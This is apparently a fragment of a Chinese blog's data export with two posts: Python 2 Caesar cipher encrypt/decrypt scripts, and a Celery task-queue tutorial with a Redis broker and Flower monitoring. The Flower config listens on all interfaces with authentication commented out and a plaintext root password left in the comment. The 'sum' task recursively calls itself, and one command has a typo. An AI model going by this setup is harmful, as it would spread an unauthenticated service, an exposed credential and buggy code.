凯撒密码加密脚 交单的26次加密脚本 #coding:utf-8 upperDict=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'] lowerDict=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'] def cesarWithLetter(ciphertext,offset): ''' 凯撒密码 : 只转换字母(包括大写小写) 参数 : ciphertext : 明文 offset : 偏移量 ''' result = \"\" for ch in ciphertext: if ch.isupper(): result=result+upperDict[((upperDict.index(ch)+offset)%26)] elif ch.islower(): result=result+lowerDict[((lowerDict.index(ch)+offset)%26)] elif ch.isdigit(): result=result+ch else: result=result+ch return result def printAllResult(ciphertext): ''' 打印所有偏移结果 ''' for i in range(len(upperDict)): print cesarWithLetter(ciphertext,i) ciphertext=raw_input(\"Please input the words :\") printAllResult(ciphertext) 自动控制偏移位自动解密 #-*-coding:utf-8-*- __author__ = 007 __date__ = 2016 / 02 / 04 #==================================================================# # 凯撒密码(caesar)是最早的代换密码,对称密码的一种 # # 算法：将每个字母用字母表中它之后的第k个字母（称作位移值）替代 # #==================================================================# def encryption(): str_raw = raw_input(\"请输入明文：\") k = input(\"请输入位移值：\") str_change = str_raw.lower() str_list = list(str_change) str_list_encry = str_list i = 0 while i &lt; len(str_list): if ord(str_list[i]) &lt; 123-k: str_list_encry[i] = chr(ord(str_list[i]) + k) else: str_list_encry[i] = chr(ord(str_list[i]) + k - 26) i = i+1 print \"加密结果为：\"+\"\".join(str_list_encry) def decryption(): str_raw = raw_input(\"请输入密文：\") k = input(\"请输入位移值：\") str_change = str_raw.lower() str_list = list(str_change) str_list_decry = str_list i = 0 while i &lt; len(str_list): if ord(str_list[i]) >= 97+k: str_list_decry[i] = chr(ord(str_list[i]) - k) else: str_list_decry[i] = chr(ord(str_list[i]) + 26 - k) i = i+1 print \"解密结果为：\"+\"\".join(str_list_decry) while True: print u\"1. 加密\" print u\"2. 解密\" choice = raw_input(\"请选择：\") if choice == \"1\": encryption() elif choice == \"2\": decryption() else: print u\"您的输入有误！\" #if __name__ == \"__main__\": # main","categories":[{"name":"密码学","slug":"密码学","permalink":"https://yubenliu.cn/categories/密码学/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://yubenliu.cn/tags/密码学/"},{"name":"Python","slug":"Python","permalink":"https://yubenliu.cn/tags/Python/"}]},{"title":"python中的任务队列","slug":"python-task-ququ22e","date":"2018-01-02T06:20:00.000Z","updated":"2019-11-12T07:01:57.542Z","comments":true,"path":"2018/01/02/python-task-ququ22e/","link":"","permalink":"https://yubenliu.cn/2018/01/02/python-task-ququ22e/","excerpt":"为什么要做任务队列 要回答这个问题我们首先看看在流水线上的案列，如果人的速度很慢，机器的速度比人的速度快很多，就会造成，机器生产的东西没有及时处理，越积越多，造成阻塞，影响生产。","text":"为什么要做任务队列 要回答这个问题我们首先看看在流水线上的案列，如果人的速度很慢，机器的速度比人的速度快很多，就会造成，机器生产的东西没有及时处理，越积越多，造成阻塞，影响生产。 任务队列的意义： 打个比方如果出现人的速度跟不上机器速度怎么办，这个时候我们就需要第三方，监管人员（任务队列）把机器生产的东西，放在一个地方，（队列），然后分配给每个用户，有条不理的执行。 python 里面的celery 模块是一个简单，灵活且可靠的，处理大量消息的分布式系统，并且提供维护这样一个系统的必需工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。 关于安装celery pip install Celery 关于celery 的概念介绍消息队列消息队列的输入是工作的一个单元，称为任务，独立的职程（Worker）进程持续监视队列中是否有需要处理的新任务。Celery 用消息通信，通常使用中间人（Broker）在客户端和职程间斡旋。这个过程从客户端向队列添加消息开始，之后中间人把消息派送给职程，职程对消息进行处理。如下图所示： Celery 系统可包含多个职程和中间人，以此获得高可用性和横向扩展能力。Celery**的架构Celery的架构由三部分组成，消息中间件（message broker），任务执行单元（worker）和任务执行结果存储（task result store）组成。 消息中间件Celery本身不提供消息服务，但是可以方便的和第三方提供的消息中间件集成，包括，RabbitMQ,Redis,MongoDB等，这里我先去了解RabbitMQ,Redis。 任务执行单元Worker是Celery提供的任务执行的单元，worker并发的运行在分布式的系统节点中 任务结果存储**Task result store用来存储Worker执行的任务的结果，Celery支持以不同方式存储任务的结果，包括Redis，MongoDB，Django ORM，AMQP等，这里我先不去看它是如何存储的，就先选用Redis来存储任务执行结果。 实战 环境 kaillinux 主机两台（192.168.29.234，192.168.29.198） redis (192.168.29.234 ) flower (192.168.29.234) 任务脚本（两台都必须部署） 任务脚本 tasks.py (计算加减乘除) import os import sys import datetime BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) sys.path.append(BASE_DIR) from celery import Celery from celery import chain, group, chord, Task import celeryconfig app = Celery() app.config_from_object(celeryconfig) __all__ = [&#39;add&#39;, &#39;reduce&#39;,&#39;sum_all&#39;, &#39;other&#39;] #################################### # tas # #################################### @app.task def add(x, y): return x + y @app.task def reduce(x, y): return x - y @app.task def sum(values): return sum([int(value) for value in values]) @app.task def other(x, y): return x * y celeryconfig.py !/usr/bin/python #coding:utf-8 from kombu import Queue CELERY_TIMEZONE = &#39;Asia/Shanghai&#39; #################################### # 一般配置 # #################################### CELERY_TASK_SERIALIZER = &#39;json&#39; CELERY_RESULT_SERIALIZER = &#39;json&#39; CELERY_ACCEPT_CONTENT=[&#39;json&#39;] CELERY_TIMEZONE = &#39;Asia/Shanghai&#39; CELERY_ENABLE_UTC = True # List of modules to import when celery starts. CELERY_IMPORTS = (&#39;tasks&#39;, ) CELERYD_MAX_TASKS_PER_CHILD = 40 # 每个worker执行了多少任务就会死掉 BROKER_POOL_LIMIT = 10 #默认celery与broker连接池连接数 CELERY_DEFAULT_QUEUE=&#39;default&#39; CELERY_DEFAULT_ROUTING_KEY=&#39;task.default&#39; CELERY_RESULT_BACKEND=&#39;redis://192.168.29.234:6379/0&#39; BROKER_URL=&#39;redis://192.168.29.234:6379/0&#39; #默认队列 CELERY_DEFAULT_QUEUE = &#39;celery&#39; CELERY_DEFAULT_ROUTING_KEY = &#39;celery&#39; CELERYD_LOG_FILE=&quot;./logs/celery.log&quot; CELERY_QUEUEs = ( Queue(&quot;queue_add&quot;, routing_key=&#39;queue_add&#39;), Queue(&#39;queue_reduce&#39;, routing_key=&#39;queue_sum&#39;), Queue(&#39;celery&#39;, routing_key=&#39;celery&#39;), ) CELERY_ROUTES = { &#39;task.add&#39;:{&#39;queue&#39;:&#39;queue_add&#39;, &#39;routing_key&#39;:&#39;queue_add&#39;}, &#39;task.reduce&#39;:{&#39;queue&#39;:&#39;queue_reduce&#39;, &#39;routing_key&#39;:&#39;queue_sum&#39;}, } 关于flower是监控任务信息的web 图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower 文件flower github 在234 上flower.py 的脚本 #!/usr/bin/env python #coding:utf-8 broker_api = &#39;redis://127.0.0.1:6379/0&#39; logging = &#39;DEBUG&#39; address = &#39;0.0.0.0&#39; port = 5555 #外部访问密码 #basic_auth=[&#39;root:ybl8651073&#39;] persistent=True #持久化celery tasks（如果为false的话，重启flower之后，监控的task就消失了) db=&quot;/root/flower_db&quot; 运行 在198上启动celery worker -A tasks --loglevel=info --queues=celery,queue_add --hostname=celery_worker198 在234 上启动 1. redis服务 2. celery worker -A tasks --loglevel=info --queues=celery,queue_reduce --hostname=celery_worker234 3. celery flower worker -A tasks --config==/root/flower.py 服务器验证 在任一台有celeryservice项目代码的服务器上，运行add、reduce、- sum、other任务（测试可简单使用add.delay(1,2)等） add只会在198上运行， sum任务，可能会在198或234服务器的worker节点运行 reduce任务,只会在234上运行。 other任务可能会在198或者234上运行。 打开监控web 192.168.29.234:5555 随机运行几个任务 分析 也可以通过 curl提交任务curl -X POST -d &#39;{&quot;args&quot;:[1,2]}&#39; http://192.168.29.234:5555/api/task/async-apply/tasks.add","categories":[{"name":"django任务队列","slug":"django任务队列","permalink":"https://yubenliu.cn/categories/django任务队列/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://yubenliu.cn/tags/Python/"},{"name":"Linux","slug":"Linux","permalink":"https://yubenliu.cn/tags/Linux/"},{"name":"django","slug":"django","permalink":"https://yubenliu.cn/tags/django/"}]}]}